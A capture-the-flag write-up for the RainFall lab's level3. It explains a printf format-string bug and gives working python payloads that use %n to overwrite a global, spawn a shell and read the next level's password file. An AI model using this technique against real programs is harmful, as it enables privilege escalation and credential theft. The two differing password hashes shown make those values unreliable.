# Level3

## Analysis

**In `main` :**

call to function `v()`

**In `v()` :**

`fgets` on `stdin` to a string `format` with a limited size of `0x200` characters
This `format` string is used in `printf(format)` which is a vulnerability, referring to printf man
 ```
    Code such as printf(foo); often indicates a bug, since foo may
    contain a % character.  If foo comes from untrusted user input,
    it may contain %n, causing the printf() call to write to memory
    and creating a security hole.
 ```
and then it calls a `system("/bin/sh")` if the global variable `m` equal `0x40`

`m` adress:
```
(gdb) info variable
...
0x0804988c  m
...
```
___

## Exploit

Testing the printf
```
level3@RainFall:~$ python -c 'print "%x %x %x %x"' | ./level3
200 b7fd1ac0 b7ff37d0 25207825
```

If we try to store a buffer `ABCD`, its done on the fourth position
```
level3@RainFall:~$ python -c 'print "ABCD %4$x"' | ./level3
ABCD 44434241
```

We can now change global `m` using `%n` and it adress
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%4$x"' | ./level3
��804988c
```

`m` is now equal to 4 because `"\x8c\x98\x04\x08"` takes 4 bytes
It must equal `0x40` which 64
Just add 60 with `"%60d"`
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"' | ./level3
��                                                         512
Wait what?!
```

And we just need to keep stdin open to acces the shell
```
level3@RainFall:~$ python -c 'print "\x8c\x98\x04\x08" + "%60d" + "%4$n"' > /tmp/level3 && cat /tmp/level3 - | ./level3
��                                                         512
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

___

*Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02*